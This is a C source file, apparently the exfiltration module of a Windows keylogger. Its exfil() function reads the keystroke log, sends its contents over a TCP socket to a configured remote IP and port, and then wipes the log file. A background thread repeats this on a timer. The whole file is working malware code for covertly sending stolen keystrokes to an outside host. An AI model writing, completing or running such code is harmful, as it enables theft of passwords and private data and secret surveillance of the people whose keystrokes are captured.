#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "../winconsts.h"
#include "winexfil.h"
#include "winkeylog.h"

void exfil() {
	FILE* file = fopen(KEY_LOG_FILE, "rb");
	fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    char* buffer = (char*)malloc(fileSize);
    fread(buffer, 1, fileSize, file);
    fclose(file);

	WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        char err[20];
        sprintf(err, "Err: %d", WSAGetLastError());
        MessageBoxA(NULL, err, "Socket Fail", MB_OK);
        WSACleanup();
        return;
    }
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
        send(sock, buffer, fileSize, 0);
    }

    closesocket(sock);
    WSACleanup();
    free(buffer);
    FILE* wipe = fopen(KEY_LOG_FILE, "w");
    if (wipe) fclose(wipe);
}
DWORD WINAPI exfilThread(LPVOID lpParam) {
    while (TRUE) {
        Sleep(EXFIL_RATE); 
        exfil(); 
    }
    return 0;
}